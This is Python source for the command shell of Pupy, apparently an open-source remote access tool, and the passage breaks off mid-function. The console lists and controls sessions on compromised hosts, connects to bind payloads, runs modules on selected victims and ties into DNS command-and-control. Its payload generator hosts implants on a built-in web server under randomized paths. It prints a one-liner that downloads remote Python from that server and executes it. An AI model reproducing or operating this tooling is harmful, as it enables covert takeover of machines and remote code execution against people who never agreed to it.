# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
import sys
import readline
import cmd
import shlex
import string
import re
import os
import os.path
import traceback
import platform
import random
import code
try:
    import __builtin__ as builtins
except ImportError:
    import builtins
from multiprocessing.pool import ThreadPool
import time
import logging
import traceback
import rpyc
import rpyc.utils.classic
from .PythonCompleter import PythonCompleter
from .PupyErrors import PupyModuleExit, PupyModuleError
from .PupyModule import PupyArgumentParser
from .PupyJob import PupyJob
from .PupyCompleter import PupyCompleter
from .PupyVersion import BANNER, BANNER_INFO
from argparse import REMAINDER
import copy
from functools import partial
from threading import Event
from pupylib.utils.term import colorize
from pupylib.utils.network import *

import pupygen

def color_real(s, color, prompt=False, colors_enabled=True):
    """ color a string using ansi escape characters. set prompt to true to add marks for readline to see invisible portions of the prompt
    cf. http://stackoverflow.com/questions/9468435/look-how-to-fix-column-calculation-in-python-readline-if-use-color-prompt"""
    if s is None:
        return ""
    s=str(s)
    if not colors_enabled:
        return s
    res=s
    COLOR_STOP="\033[0m"
    prompt_stop=""
    prompt_start=""
    if prompt:
        prompt_stop="\002"
        prompt_start="\001"
    if prompt:
        COLOR_STOP=prompt_start+COLOR_STOP+prompt_stop
    if color.lower()=="random":
        color=random.choice(["blue","red","green","yellow"])
    if color.lower()=="blue":
        res=prompt_start+"\033[34m"+prompt_stop+s+COLOR_STOP
    if color.lower()=="red":
        res=prompt_start+"\033[31m"+prompt_stop+s+COLOR_STOP
    if color.lower()=="green":
        res=prompt_start+"\033[32m"+prompt_stop+s+COLOR_STOP
    if color.lower()=="yellow":
        res=prompt_start+"\033[33m"+prompt_stop+s+COLOR_STOP
    if color.lower()=="grey":
        res=prompt_start+"\033[37m"+prompt_stop+s+COLOR_STOP
    if color.lower()=="darkgrey":
        res=prompt_start+"\033[1;30m"+prompt_stop+s+COLOR_STOP
    return res

def get_columns_size(l):
    size_dic={}
    for d in l:
        for i,k in d.iteritems():
            if type(k) is not str:
                k=str(k)

            escalign=len(''.join(re.findall('(\033[^m]+m)', k)))
            l = len(k) - escalign

            if not i in size_dic:
                size_dic[i]=l
            elif size_dic[i]<l:
                size_dic[i]=l
    return size_dic

def obj2utf8(obj):
    if type(obj)==dict:
        for k in obj:
            obj[k]=obj2utf8(obj[k])
    elif type(obj)==list:
        for i in range(0,len(obj)):
            obj[i]=obj2utf8(obj[i])
    elif type(obj)==tuple:
        obj=list(obj)
        for i in range(0,len(obj)):
            obj[i]=obj2utf8(obj[i])
        obj=tuple(obj)
    elif type(obj)==unicode:
        return obj.encode('utf8', errors='replace')
    elif type(obj)==str:
        # assume str sent by client is already utf8
        return obj
    else:
        obj=str(obj)
    return obj

class WindowsColoredStdout(object):
    def __init__(self, write_color):
        from ctypes import c_ulong, windll
        STD_OUTPUT_HANDLE_ID = c_ulong(0xfffffff5)
        windll.Kernel32.GetStdHandle.restype = c_ulong
        self.std_output_hdl = windll.Kernel32.GetStdHandle(STD_OUTPUT_HANDLE_ID)
        self.SetConsoleTextAttribute=windll.Kernel32.SetConsoleTextAttribute
        self.write_color=write_color
    def write(self, msg):
        for attr, chunk in self.write_color(msg)[1]:
            self.SetConsoleTextAttribute(self.std_output_hdl, attr.get_winattr())
            sys.stdout.write(chunk)
    def flush(self):
        sys.stdout.flush()
    def read(self, *args, **kwargs):
        sys.stdout.read(*args, **kwargs)

class PupyCmd(cmd.Cmd):
    def __init__(self, pupsrv):
        cmd.Cmd.__init__(self)
        self.pupsrv = pupsrv
        self.dnscnc = pupsrv.dnscnc
        self.pupsrv.register_handler(self)
        self.config = pupsrv.config
        self.init_readline()
        global color
        try:
            color = partial(color_real, colors_enabled=self.config.getboolean("cmdline","colors"))
        except Exception:
            color = color_real

        #wrap stdout to support ANSI coloring
        if "windows" in platform.system().lower():
            if sys.stdout.isatty():
                try:
                    from pyreadline.console.ansi import write_color
                    self.stdout=WindowsColoredStdout(write_color)
                except ImportError:
                    color = partial(color_real, colors_enabled=False)
                    self.display_warning("pyreadline is not installer. Output color disabled. Use \"pip install pyreadline\"")

        self.intro = color(BANNER, 'green')
        self.intro += color(BANNER_INFO, 'darkgrey')
        if sys.platform=="win32":
            self.intro+="\n"+self.format_warning("You are running Pupy server on Windows. Pupy server works best on linux. Pupy server on windows has not been really tested and there is probably a lot of bugs. I try my best to code in a portable way but it don't always find the time to fix everything. If you find the courage to patch non portable code, I will gladly accept push requests ! :)\n")


        self.raw_prompt= color('>> ','blue')
        self.prompt = color('>> ','blue', prompt=True)
        self.doc_header = 'Available commands :\n'
        self.default_filter=None
        try:
            if not self.config.getboolean("cmdline","display_banner"):
                self.intro=""
        except Exception:
            pass
        self.aliases={}
        for m in self.pupsrv.get_aliased_modules():
            self.aliases[m]=m
        try:
            for command, alias in self.config.items("aliases"):
                logging.debug("adding alias: %s => %s"%(command, alias))
                self.aliases[command]=alias
        except Exception as e:
            logging.warning("error while parsing aliases from pupy.conf ! %s"%str(traceback.format_exc()))
        self.pupy_completer=PupyCompleter(self.aliases, self.pupsrv)

    def add_motd(self, motd={}):
        for ok in motd.get('ok', []):
            self.intro += self.format_srvinfo(ok + '\n')

        for fail in motd.get('fail', []):
            self.intro += self.format_error(fail + '\n')

        self.intro.rstrip('\n')

    @staticmethod
    def table_format(diclist, wl=[], bl=[]):
        """
            this function takes a list a dictionaries to display in columns. Dictionnaries keys are the columns names.
            All dictionaries must have the same keys.
            wl is a whitelist of column names to display
            bl is a blacklist of columns names to hide
        """
        res=""
        if diclist:
            diclist=obj2utf8(diclist)
            keys=[x for x in diclist[0].iterkeys()]
            if wl:
                keys=[x for x in wl if x in keys]
            if bl:
                keys=[x for x in keys if x not in bl]
            titlesdic={}
            for k in keys:
                titlesdic[k]=k
            diclist.insert(0,titlesdic)
            colsize=get_columns_size(diclist)
            i=0
            for c in diclist:
                if i==1:
                    res+="-"*sum([k+2 for k in [y for x,y in colsize.iteritems() if x in titlesdic]])+"\n"
                i+=1
                for name in keys:
                    if c[name] is not unicode:
                        value=str(c[name]).strip()
                    else:
                        value=c[name].strip()
                    utf8align=len(value)-len(value.decode('utf8',errors='replace'))
                    escalign=len(''.join(re.findall('(\033[^m]+m)', value)))
                    res+=value.ljust(colsize[name]+2+utf8align+escalign)
                res+="\n"
        return res

    def default(self, line):
        tab=line.split(" ",1)
        if tab[0] in self.aliases:
            arg_parser = PupyArgumentParser(prog=tab[0], add_help=False)
            arg_parser.add_argument('-f', '--filter', metavar='<client filter>', help="filter to a subset of all clients. All fields available in the \"info\" module can be used. example: run get_info -f 'platform:win release:7 os_arch:64'")
            arg_parser.add_argument('--bg', action='store_true', help="run in background")
            arg_parser.add_argument('arguments', nargs=REMAINDER, metavar='<arguments>', help="module arguments")
            if len(tab)==1:
                self.do_run(self.aliases[tab[0]])
            else:
                left=[]
                try:
                    modargs,left=arg_parser.parse_known_args(shlex.split(tab[1]))
                except PupyModuleExit:
                    return
                #putting run arguments (-f and --bg) back at their place in case of aliases
                newargs_str=""
                if modargs.bg:
                    newargs_str+=" --bg"
                if modargs.filter:
                    newargs_str+=" -f '"+modargs.filter.replace("'","'\\''")+"'"
                newargs_str+=" "+self.aliases[tab[0]]
                if left:
                    newargs_str+=" "+' '.join(left)
                if modargs.arguments:
                    newargs_str+=' '+' '.join(["'"+x.replace("'","'\\''")+"'" for x in modargs.arguments])
                self.do_run(newargs_str.strip())
        else:
            self.display_error("Unknown syntax: %s"%line)

    def init_readline(self):
        try:
            readline.read_history_file(".pupy_history")
        except Exception:
            pass
        self.init_completer()

    def cmdloop(self, intro=None):
        try:
            cmd.Cmd.cmdloop(self, intro)
        except KeyboardInterrupt as e:
            self.stdout.write('\n')
            self.cmdloop(intro="")

    def init_completer(self):
        readline.set_pre_input_hook(self.pre_input_hook)
        readline.set_completer_delims(" \t")

    def completenames(self, text, *ignored):
        dotext = 'do_'+text
        return [
            a[3:]+' ' for a in self.get_names() if a.startswith(dotext) and not a == 'do_EOF'
        ] + [
            x+' ' for x in self.aliases.iterkeys() if x.startswith(text)
        ]

    def pre_input_hook(self):
        #readline.redisplay()
        pass

    def emptyline(self):
        """ do nothing when an emptyline is entered """
        pass

    def do_EOF(self, arg):
        """ ignore EOF """
        self.stdout.write('\n')

    def do_help(self, arg):
        """ show this help """
        if arg:
            try:
                func = getattr(self, 'help_' + arg)
            except AttributeError:
                try:
                    m=self.pupsrv.get_module(self.pupsrv.get_module_name_from_category(arg))
                    if m:
                        self.do_run(arg+" --help") #quick and dirty
                        return
                except AttributeError:
                    pass
                self.stdout.write("%s\n"%str(self.nohelp % (arg,)))
                return
            func()
        else:
            names = self.get_names()
            cmds_doc = []
            help = {}
            for name in names:
                if name[:5] == 'help_':
                    help[name[5:]]=1
            names.sort()
            # There can be duplicates if routines overridden
            prevname = ''
            for name in names:
                if name[:3] == 'do_' and not name == 'do_EOF':
                    if name == prevname:
                        continue
                    prevname = name
                    cmd=name[3:]
                    if cmd in help:
                        cmds_doc.append(cmd)
                        del help[cmd]
                    elif getattr(self, name).__doc__:
                        cmds_doc.append((cmd, getattr(self, name).__doc__.strip()))
                    else:
                        cmds_doc.append((cmd, ""))
            for name in [x for x in self.aliases.iterkeys()]:
                cmds_doc.append((name, self.pupsrv.get_module(self.aliases[name].split()[0]).__doc__))

            self.stdout.write("%s\n"%str(self.doc_header))
            cmds_doc.sort()
            for command,doc in cmds_doc:
                if doc is None:
                    doc=""
                self.stdout.write("- {:<15}    {}\n".format(command, color(doc.title().strip(),'grey')))

    @staticmethod
    def format_log(msg):
        """ return a formated log line """
        return msg.rstrip()+"\n"

    @staticmethod
    def format_error(msg):
        """ return a formated error log line """
        return color('[-] ','red')+msg.rstrip()+"\n"

    @staticmethod
    def format_warning(msg):
        """ return a formated warning log line """
        return color('[!] ','yellow')+msg.rstrip()+"\n"

    @staticmethod
    def format_success(msg):
        """ return a formated info log line """
        return color('[+] ','green')+msg.rstrip()+"\n"

    @staticmethod
    def format_info(msg):
        """ return a formated info log line """
        return color('[%] ','darkgrey')+msg.rstrip()+"\n"

    @staticmethod
    def format_srvinfo(msg):
        """ return a formated info log line """
        return color('[*] ','blue')+msg.rstrip()+"\n"

    @staticmethod
    def format_section(msg):
        """ return a formated info log line """
        return color('#>#>  ','green')+color(msg.rstrip(),'darkgrey')+color('  <#<#','green')+"\n"

    def display(self, msg, modifier=None):
        if not type(msg) is unicode:
            # force output unicode string to output
            # Python will hopefully handle output printing
            msg=obj2utf8(msg)
        if msg:
            if modifier=="error":
                self.stdout.write(PupyCmd.format_error(msg))
            elif modifier=="success":
                self.stdout.write(PupyCmd.format_success(msg))
            elif modifier=="info":
                self.stdout.write(PupyCmd.format_info(msg))
            elif modifier=="srvinfo":
                buf_bkp=readline.get_line_buffer()
                #nG move cursor to column n
                #nE move cursor ro the beginning of n lines down
                #nK Erases part of the line. If n is zero (or missing), clear from cursor to the end of the line. If n is one, clear from cursor to beginning of the line. If n is two, clear entire line. Cursor position does not change.
                self.stdout.write("\x1b[0G"+PupyCmd.format_srvinfo(msg)+"\x1b[0E")
                self.stdout.write("\x1b[2K")#clear line
                self.stdout.write(self.raw_prompt+buf_bkp)#"\x1b[2K")
                try:
                    readline.redisplay()
                except Exception:
                    pass
            elif modifier=="warning":
                self.stdout.write(PupyCmd.format_warning(msg))
            else:
                self.stdout.write(PupyCmd.format_log(msg))

    def display_srvinfo(self, msg):
        return self.display(msg, modifier="srvinfo")

    def display_success(self, msg):
        return self.display(msg, modifier="success")

    def display_error(self, msg):
        return self.display(msg, modifier="error")

    def display_warning(self, msg):
        return self.display(msg, modifier="warning")

    def display_info(self, msg):
        return self.display(msg, modifier="info")

    def postcmd(self, stop, line):
        readline.write_history_file('.pupy_history')
        return stop

    def do_list_modules(self, arg):
        """ List available modules with a brief description (the first description line) """
        system = ''
        if self.default_filter:
            system = self.pupsrv.get_clients(self.default_filter)[0].desc['platform'].lower()
            self.display_success("List modules compatible with the selected host: %s" % system)
        else:
            self.display_success("List all modules")

        for mod in sorted([x for x in self.pupsrv.iter_modules()], key=(lambda x:x.category)):
            if mod.is_module:
                if (self.default_filter and (system in mod.compatible_systems or not mod.compatible_systems)) or (not self.default_filter):
                    if mod.__doc__:
                        doc = mod.__doc__.strip()
                    else:
                       doc = ''
                    self.stdout.write("{:<25}    {}\n".format("%s/%s"%(mod.category,mod.get_name()), color(doc.title().split("\n",1)[0],'grey')))

    def do_tag(self, arg):
        """ add tag to current session """
        arg_parser = PupyArgumentParser(prog='sessions', description=self.do_tag.__doc__)
        arg_parser.add_argument('-a', '--add', metavar='tag', nargs='+', help='Add tags')
        arg_parser.add_argument('-r', '--remove', metavar='tag', nargs='+', help='Remove tags')
        arg_parser.add_argument('-w', '--write-project', action='store_true',
                                    default=False, help='save config to project folder')
        arg_parser.add_argument('-W', '--write-user', action='store_true',
                                    default=False, help='save config to user folder')

        try:
            modargs = arg_parser.parse_args(shlex.split(arg))
        except PupyModuleExit:
            return

        data = []

        clients = self.pupsrv.get_clients(self.default_filter)

        if not clients:
            return

        for client in clients:
            tags = self.pupsrv.config.tags(client.node())

            if modargs.remove:
                tags.remove(*modargs.remove)

            if modargs.add:
                tags.add(*modargs.add)

            data.append({
                'ID': client.node(),
                'TAGS': tags
            })

        self.config.save(project=modargs.write_project, user=modargs.write_user)

        self.display(
            PupyCmd.table_format(data)
        )

    def do_sessions(self, arg):
        """ list/interact with established sessions """
        arg_parser = PupyArgumentParser(prog='sessions', description=self.do_sessions.__doc__)
        arg_parser.add_argument('-i', '--interact', metavar='<filter>', help="change the default --filter value for other commands")
        arg_parser.add_argument('-g', '--global-reset', action='store_true', help="reset --interact to the default global behavior")
        arg_parser.add_argument('-l', dest='list', action='store_true', help='List all active sessions')
        arg_parser.add_argument('-k', dest='kill', metavar='<id>', type=int, help='Kill the selected session')
        arg_parser.add_argument('-K', dest='killall', action='store_true', help='Kill all sessions')
        arg_parser.add_argument('-d', dest='drop', metavar='<id>', type=int, help='Drop the connection (abruptly close the socket)')
        arg_parser.add_argument('-D', dest='dropall', action='store_true', help='Drop all connections')

        try:
            modargs=arg_parser.parse_args(shlex.split(arg))
        except PupyModuleExit:
            return

        if modargs.global_reset:
            self.default_filter=None
            self.display_success("default filter reset to global !")
        elif modargs.interact:
            self.default_filter=modargs.interact
            self.display_success("default filter set to %s"%self.default_filter)
        elif modargs.kill:
            selected_client = self.pupsrv.get_clients(modargs.kill)
            if selected_client:
                try:
                    selected_client[0].conn.exit()
                except Exception:
                    pass
        elif modargs.drop:
            selected_client = self.pupsrv.get_clients(modargs.drop)
            if selected_client:
                try:
                    selected_client[0].conn._conn.close()
                except Exception:
                    pass

        elif modargs.dropall:
            clients = list(self.pupsrv.get_clients_list())
            for client in clients:
                try:
                    client.conn._conn.close()
                except Exception:
                    pass

        elif modargs.list or not arg:
            client_list = self.pupsrv.get_clients_list()

            if self.default_filter:
                filtered_clients = self.pupsrv.get_clients(self.default_filter)
            else:
                filtered_clients = client_list

            columns = [
                'id', 'user', 'hostname', 'platform', 'release', 'os_arch',
                'proc_arch', 'intgty_lvl', 'address', 'tags'
            ]

            content = []

            for client in client_list:
                color = 'white' if client in filtered_clients else 'darkgrey'

                data = {
                    k:colorize(v, color)
                    for k,v in client.desc.iteritems() if k in columns
                }

                data.update({
                    'tags': colorize(self.config.tags(client.node()), color)
                })

                content.append(data)

            self.display(PupyCmd.table_format(content, wl=columns))

        elif modargs.killall:
            client_list=self.pupsrv.get_clients_list()
            objectClient = [x.desc for x in client_list]
            for client in objectClient:
                try:
                    self.pupsrv.get_clients(client['id'])[0].conn.exit()
                except Exception:
                    pass

    def do_jobs(self, arg):
        """ manage jobs """
        arg_parser = PupyArgumentParser(prog='jobs', description='list or kill jobs')
        arg_parser.add_argument('-k', '--kill', metavar='<job_id>', help="print the job current output before killing it")
        arg_parser.add_argument('-l', '--list', action='store_true', help="list jobs")
        arg_parser.add_argument('-p', '--print-output', metavar='<job_id>', help="print a job output")
        try:
            modargs=arg_parser.parse_args(shlex.split(arg))
        except PupyModuleExit:
            return
        try:
            if modargs.kill:
                j=self.pupsrv.get_job(modargs.kill)
                self.display(j.result_summary())
                j.stop()
                del j
                self.display_success("job killed")
            elif modargs.print_output:
                j=self.pupsrv.get_job(modargs.print_output)
                self.display(j.result_summary())
            elif modargs.list:
                if len(self.pupsrv.jobs)>0:
                    dictable=[]
                    for k,v in self.pupsrv.jobs.iteritems():
                        dic={"id":k, "job":str(v)}
                        status="running"
                        if v.is_finished():
                            status="finished"
                        dic["status"]=status
                        dic["clients_nb"]=str(v.get_clients_nb())
                        dictable.append(dic)
                    self.display(PupyCmd.table_format(dictable, wl=["id", "job", "clients_nb","status"]))
                else:
                    self.display_error("No jobs are currently running !")
            else: #display help
                try:
                    arg_parser.parse_args(["-h"])
                except PupyModuleExit:
                    return
        except PupyModuleError as e:
            self.display_error(e)
        except Exception as e:
            self.display_error(traceback.format_exc())

    def do_python(self,arg):
        """ start the local python interpreter (for debugging purposes) """
        orig_exit=builtins.exit
        orig_quit=builtins.quit
        def disabled_exit(*args, **kwargs):
            self.display_warning("exit() disabled ! use ctrl+D to exit the python shell")
        builtins.exit=disabled_exit
        builtins.quit=disabled_exit
        oldcompleter=readline.get_completer()
        try:
            local_ns={"pupsrv":self.pupsrv}
            readline.set_completer(PythonCompleter(local_ns=local_ns).complete)
            readline.parse_and_bind('tab: complete')
            code.interact(local=local_ns)
        except Exception as e:
            self.display_error(str(e))
        finally:
            readline.set_completer(oldcompleter)
            readline.parse_and_bind('tab: complete')
            builtins.exit=orig_exit
            builtins.quit=orig_quit

    def do_connect(self, arg):
        """ connect on a client using a bind payload """
        self.pupsrv.connect_on_client(arg)
        self.display("\n")

    def do_logging(self, arg):
        """ change pupysh logging level """
        arg_parser = PupyArgumentParser(prog='logging', description='change pupysh logging level')
        arg_parser.add_argument('level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], help="module")
        try:
            modargs=arg_parser.parse_args(shlex.split(arg))
        except PupyModuleExit:
            return
        if modargs.level:
            logging.getLogger().setLevel(modargs.level)
            self.display_success("logging level set to %s"%modargs.level)

    def do_run(self, arg):
        """ run a module on one or multiple clients"""
        arg_parser = PupyArgumentParser(prog='run', description='run a module on one or multiple clients')
        arg_parser.add_argument('module', metavar='<module>', help="module")
        arg_parser.add_argument('-1', '--once', default=False, action='store_true', help='Unload new deps after usage')
        arg_parser.add_argument('-o', '--output', help='save command output to file.'
                                    '%%t - timestamp, %%h - host, %%m - mac, '
                                    '%%c - client shortname, %%M - module name, '
                                    '%%p - platform, %%u - user, %%a - ip address')
        arg_parser.add_argument('-f', '--filter', metavar='<client filter>', default=self.default_filter ,help="filter to a subset of all clients. All fields available in the \"info\" module can be used. example: run get_info -f 'platform:win release:7 os_arch:64'")
        arg_parser.add_argument('--bg', action='store_true', help="run in background")
        arg_parser.add_argument('arguments', nargs=REMAINDER, metavar='<arguments>', help="module arguments")
        pj=None
        try:
            modargs=arg_parser.parse_args(shlex.split(arg))
        except PupyModuleExit:
            return
        if not modargs.arguments:
            args=""
        else:
            args=modargs.arguments
        selected_clients="*"
        if modargs.filter:
            selected_clients=modargs.filter
        modargs.module=self.pupsrv.get_module_name_from_category(modargs.module)
        try:
            mod=self.pupsrv.get_module(modargs.module)
        except Exception as e:
            self.display_error("%s : %s"%(modargs.module,str(e)))
            return
        if not mod:
            self.display_error("unknown module %s !"%modargs.module)
            return

        try:
            self.pupsrv.module_parse_args(modargs.module, args)
        except PupyModuleExit:
            return

        l=[None]
        if mod.need_at_least_one_client:
            l=self.pupsrv.get_clients(selected_clients)
            if not l:
                if not self.pupsrv.clients:
                    self.display_error("no clients currently connected")
                else:
                    self.display_error("no clients match this search!")
                return

        if mod.max_clients!=0 and len(l)>mod.max_clients:
            self.display_error("This module is limited to %s client(s) at a time and you selected %s clients"%(mod.max_clients, len(l)))
            return

        modjobs=[x for x in self.pupsrv.jobs.itervalues() if x.pupymodules[0].get_name() == mod.get_name() and x.pupymodules[0].client in l]
        pj=None
        try:
            interactive=False
            if mod.daemon and mod.unique_instance and modjobs:
                pj=modjobs[0]
            else:
                pj=PupyJob(self.pupsrv, "%s %s"%(modargs.module, args))
                if len(l)==1 and not modargs.bg and not mod.daemon:
                    ps=mod(l[0], pj, stdout=self.stdout, log=modargs.output)
                    pj.add_module(ps)
                    interactive=True
                else:
                    for c in l:
                        ps=mod(c, pj)
                        pj.add_module(ps)
            try:
                pj.start(args, once=modargs.once)
            except Exception as e:
                self.display_error(e)
                pj.stop()

            if not mod.unique_instance:
                if modargs.bg:
                    self.pupsrv.add_job(pj)
                    self.display_info("job %s started in background !"%pj)
                elif mod.daemon:
                    self.pupsrv.add_job(pj)
                    self.display_info("job %s started in background !"%pj)
                else:
                    error=pj.interactive_wait()
                    if error and not modjobs:
                        pj.stop()
            else:
                if mod.daemon and not modjobs:
                    self.pupsrv.add_job(pj)
                error=pj.interactive_wait()
                if error and not modjobs:
                    pj.stop()

        except KeyboardInterrupt:
            self.display_warning("interrupting job ... (please wait)")
            pj.interrupt()
            self.display_warning("job interrupted")
        if not interactive:
            self.display(pj.result_summary())
        else:
            if pj:
                pj.free()
                del pj

    def complete(self, text, state):
        if state == 0:
            import readline
            origline = readline.get_line_buffer()
            line = origline.lstrip()
            stripped = len(origline) - len(line)
            begidx = readline.get_begidx() - stripped
            endidx = readline.get_endidx() - stripped
            if begidx>0:
                cmd, args, foo = self.parseline(line)
                if cmd == '':
                    compfunc = self.completedefault
                else:
                    try:
                        #compfunc = getattr(self, 'complete_' + cmd)
                        compfunc = self.pupy_completer.complete
                    except AttributeError:
                        compfunc = self.completedefault
            else:
                compfunc = self.completenames
            self.completion_matches = compfunc(text, line, begidx, endidx)
        try:
            if self.completion_matches:
                return self.completion_matches[state]
        except IndexError:
            return None

    def do_restart(self, arg):
        """ Restart with same command line arguments """
        argv0 = os.readlink('/proc/self/exe')
        argv = [ x for x in open('/proc/self/cmdline').read().split('\x00') if x ]

        if self.dnscnc:
            self.display_success('Stopping DNSCNC')
            self.dnscnc.stop()

        self.pupsrv.stop()

        self.display_success('Restarting')
        os.execv(argv0, argv)

    def do_config(self, arg):
        """ Work with configuration file """

        arg_parser = PupyArgumentParser(prog='config', description=self.do_config.__doc__)
        commands = arg_parser.add_subparsers(title='commands', dest='command')

        cmdlist = commands.add_parser('list', help='list configured options')
        cmdlist.add_argument('section', help='list section', nargs='?', default='')
        cmdlist.add_argument('-s', '--sections', help='list sections', action='store_true')

        cmdset = commands.add_parser('set', help='set config option')
        cmdset.add_argument('-w', '--write-project', action='store_true',
                                    default=False, help='save config to project folder')
        cmdset.add_argument('-W', '--write-user', action='store_true',
                                    default=False, help='save config to user folder')
        cmdset.add_argument('-r', '--restart', action='store_true', default=False, help='restart pupy')
        cmdset.add_argument('section', help='config section')
        cmdset.add_argument('key', help='config key')
        cmdset.add_argument('value', nargs=REMAINDER, help='value')

        cmdunset = commands.add_parser('unset', help='unset config option')
        cmdunset.add_argument('-w', '--write-project', action='store_true',
                                    default=False, help='save config to project folder')
        cmdunset.add_argument('-W', '--write-user', action='store_true',
                                    default=False, help='save config to user folder')
        cmdunset.add_argument('-r', '--restart', action='store_true', default=False, help='restart pupy')
        cmdunset.add_argument('section', help='config section')
        cmdunset.add_argument('key', help='config key')

        cmdsave = commands.add_parser('save', help='save config')
        cmdsave.add_argument('-w', '--write-project', action='store_true',
                                     default=True, help='save config to project folder')
        cmdsave.add_argument('-W', '--write-user', action='store_true',
                                     default=False, help='save config to user folder')
        cmdsave.add_argument('-r', '--restart', action='store_true', default=False, help='restart pupy')

        try:
            commands = arg_parser.parse_args(shlex.split(arg))
        except (pupygen.InvalidOptions, PupyModuleExit):
            return

        if commands.command == 'list':
            for section in self.config.sections():
                if commands.section and commands.section != section:
                    continue

                self.display('[{}]'.format(section))
                if commands.sections:
                    continue

                for variable in self.config.options(section):
                    self.display('{} = {}'.format(variable, self.config.get(section, variable)))

                self.display(' ')

        elif commands.command == 'set':
            try:
                self.config.set(commands.section, commands.key, ' '.join(commands.value))
                self.config.save(project=commands.write_project, user=commands.write_user)
                if commands.restart:
                    self.do_restart(None)

            except self.config.NoSectionError:
                self.display_error('No section: {}'.format(commands.section))

        elif commands.command == 'unset':
            try:
                self.config.remove_option(commands.section, commands.key)
                self.config.save(project=commands.write_project, user=commands.write_user)
                if commands.restart:
                    self.do_restart(None)

            except self.config.NoSectionError:
                self.display_error('No section: {}'.format(commands.section))

        elif commands.command == 'save':
            self.config.save(project=commands.write_project, user=commands.write_user)
            if commands.restart:
                self.do_restart(None)

    def do_gen(self, arg):
        """ Generate payload with pupygen.py """

        arg_parser = pupygen.get_parser(PupyArgumentParser, config=self.config)

        try:
            args = arg_parser.parse_args(shlex.split(arg))
        except (pupygen.InvalidOptions, PupyModuleExit):
            return

        if not args.launcher or (args.launcher and args.launcher == 'connect'):
            args.launcher = 'connect'
            transport = None
            transport_idx = None
            host = None
            host_idx = None
            port = None
            preferred_ok = True

            need_transport = False
            need_hostport = False

            if args.launcher_args:
                total = len(args.launcher_args)
                for idx,arg in enumerate(args.launcher_args):
                    if arg == '-t' and idx < total-1:
                        transport = args.launcher_args[idx+1]
                        transport_idx = idx+1
                    elif arg == '--host' and idx<total-1:
                        host_idx = idx+1
                        hostport = args.launcher_args[host_idx]
                        if ':' in hostport:
                            host, port = hostport.rsplit(':', 1)
                            port = int(port)
                        else:
                            try:
                                port = int(hostport)
                            except:
                                host = hostport

            need_transport = not bool(transport)
            need_hostport = not all([host, port])

            if not all([host, port, transport]):
                default_listener = None
                preferred_ok = False

                if transport:
                    default_listener = self.pupsrv.listeners.get(transport)
                    if not default_listener:
                        self.display_error(
                            'Requested transport {} is not active. Will use default'.format(
                                transport))

                        need_transport = True

                if not default_listener:
                    default_listener = next(self.pupsrv.listeners.itervalues())

                transport = default_listener.name

                if default_listener:
                    self.display_info(
                        'Connection point: Transport={} Address={}:{}'.format(
                            default_listener.name, default_listener.external,
                            default_listener.external_port))

                    if host or port:
                        self.display_warning('Host and port will be ignored')

                    print args.prefer_external, default_listener.local

                    if args.prefer_external != default_listener.local:
                        host = default_listener.external
                        port = default_listener.external_port
                        preferred_ok = True
                    elif not args.prefer_external and not default_listener.local:
                        host = get_listener_ip(cache=False)
                        if host:
                            self.display_warning('Using {} as local IP'.format(host))

                        port = default_listener.port
                        preferred_ok = True
                    else:
                        preferred_ok = not (default_listener.local and args.prefer_external)

            if not transport:
                self.display_error('No active transports. Explicitly choose one')
                return

            if not all([host, port, preferred_ok]):
                maybe_port = get_listener_port(self.config, external=args.prefer_external)
                maybe_host, local = get_listener_ip_with_local(
                    external=args.prefer_external,
                    config=self.config, igd=self.pupsrv.igd
                )

                if (not local and args.prefer_external) or not (host and port):
                    self.display_warning('Using configured/discovered external HOST:PORT')
                    host = maybe_host
                    port = maybe_port
                else:
                    self.display_warning('Unable to find external HOST:PORT')

            if need_transport:
                if transport_idx is None:
                    args.launcher_args += [ '-t', transport ]
                else:
                    args.launcher_args[transport_idx] = transport

            if need_hostport:
                hostport = '{}:{}'.format(host, port)
                if host_idx is None:
                    args.launcher_args += [ '--host', hostport ]
                else:
                    args.launcher_args[host_idx] = hostport

        if self.pupsrv.httpd:
            wwwroot = self.config.get_folder('wwwroot')
            if not args.output_dir:
                args.output_dir = wwwroot

        try:
            output = pupygen.pupygen(args, config=self.config)
        except Exception, e:
            self.display_error('payload generation failed: {}'.format(e))
            return

        if not output:
            self.display_error('payload generation failed')
            return

        if self.pupsrv.httpd and output.startswith(wwwroot):
            wwwpath = os.path.relpath(output, wwwroot)
            if self.config.getboolean('httpd', 'secret'):
                wwwpath = '/'.join([
                    self.config.get('randoms', 'wwwsecret', random=5)
                ] + [
                    self.config.set('randoms', None, x, random=5) for x in wwwpath.split('/')
                ])

            self.display_success('WWW URI PATH: /{}'.format(wwwpath))
            host="<host:port>"
            try:
                for i in range(0,len(args.launcher_args)):
                    if args.launcher_args[i]=="--host":
                        host=args.launcher_args[i+1]
                        break
            except:
                pass
            if args.format=='py':
                self.display_success("ONELINER: python -c 'import urllib;exec urllib.urlopen(\"http://{}/{}\").read()'".format(host, wwwpath))
            elif args.format=='ps1':
